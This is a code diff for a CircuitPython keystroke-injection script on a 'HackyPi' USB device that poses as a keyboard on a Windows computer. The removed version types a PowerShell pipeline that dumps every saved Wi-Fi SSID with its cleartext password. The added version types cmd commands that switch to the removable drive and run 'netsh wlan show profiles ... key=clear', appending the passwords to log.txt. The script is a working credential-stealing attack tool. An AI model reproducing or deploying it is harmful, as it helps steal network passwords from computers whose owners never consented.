@@ -1,4 +1,3 @@
-import os
 import time
 import board
 import busio
@@ -6,21 +5,10 @@ import usb_hid
 import digitalio
 import displayio
 import terminalio
-import storage
-import adafruit_sdcard
 from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
-
-SD_CS = board.GP17
-
-# Connect to the card and mount the filesystem.
-spi = busio.SPI(board.GP18, board.GP19, board.GP16)
-cs = digitalio.DigitalInOut(board.GP17)
-sdcard = adafruit_sdcard.SDCard(spi, cs)
-vfs = storage.VfsFat(sdcard)
-storage.mount(vfs, "/sd")
 
 # Constants for the display
 BORDER = 12
@@ -90,8 +78,8 @@ def save_file_in_current_directory(file_name, command, keyboard_layout):
 
 # Initial screen setup
 inner_rectangle()
-print_onTFT("HackyPi", 60, 40)
-print_onTFT("WIFI v2.0", 30, 80)
+print_onTFT("Welcome to", 60, 40)
+print_onTFT("HackyPi", 60, 80)
 time.sleep(3)
 
 try:
@@ -106,19 +94,31 @@ try:
     time.sleep(0.5)
     
     # Type 'cmd' and Enter
-    type_and_enter('powershell', keyboard_layout, 0.2)
+    type_and_enter('cmd', keyboard_layout, 0.2)
     
     # Delay before next command
     time.sleep(0.2)
     
-    # Get all SSID and save to log.txt on SD card
-    keyboard_layout.write('(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > log.txt')
+    # Get all SSID
+    keyboard_layout.write('FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
 
+    #Retrieve Wi-Fi profiles and save details to file
+    keyboard_layout.write("netsh wlan show profiles > profiles.txt")
+    keyboard.send(Keycode.ENTER)
+    time.sleep(0.5)
 
-    
-    
+    #Retrieve Wi-Fi passwords and save to file
+    keyboard_layout.write('for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> log.txt')
+    keyboard.send(Keycode.ENTER)
+    time.sleep(0.5)
+
+    # Exit Command Prompt
+    keyboard_layout.write('exit')
+    keyboard.send(Keycode.ENTER)
+    time.sleep(0.5)
+        
     inner_rectangle()
     print_onTFT("Files Created!!", 40, 80)
     
@@ -130,7 +130,3 @@ inner_rectangle()
 print_onTFT("Execution", 30, 40)
 print_onTFT("Complete", 60, 80)
 time.sleep(3)
-
-
-
-
